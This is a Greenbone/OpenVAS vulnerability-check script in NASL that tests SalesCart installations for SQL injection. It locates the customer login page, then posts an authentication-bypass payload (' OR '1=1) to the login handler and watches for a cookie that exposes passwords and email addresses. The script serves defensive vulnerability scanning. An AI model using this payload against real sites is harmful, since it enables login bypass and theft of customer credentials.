# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100053");
  script_version("2024-06-13T05:05:46+0000");
  script_tag(name:"last_modification", value:"2024-06-13 05:05:46 +0000 (Thu, 13 Jun 2024)");
  script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("SalesCart Multiple SQLi Vulnerabilities (Mar 2009) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"SalesCart is prone to multiple SQL injection (SQLi)
  vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in a
  SQL query.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying
  database.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/33534");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_asp(port: port))
  exit(0);

foreach dir (make_list_unique("/", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/online/customer/customer_login.asp";

  res = http_get_cache(port: port, item: url);
  if (!res || res !~ "^HTTP/1\.[01] 200")
    continue;

  if (egrep(pattern: ".*Customer Control Panel.*", string: res) ||
      egrep(pattern: ".*Order Management System, Ver [0-9}+\.[0-9]*.*", string: res)) {
    url = dir + "/online/customer/cmenu.asp";
    headers = make_array("Content-Type", "application/x-www-form-urlencoded");
    data = "name=%27+OR+%271%3D1&code=%27+OR+%271%3D1&Login=Login&Remember=ON";

    req = http_post_put_req(port: port, url: url, data: data, add_headers: headers, referer_url: url);
    res = http_keepalive_send_recv(port: port, data: req);
    if (!res)
      continue;

    if (egrep(pattern: "^Set-Cookie: SalesCart.*rememberme=ON&password=.*&email=.*", string: res)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
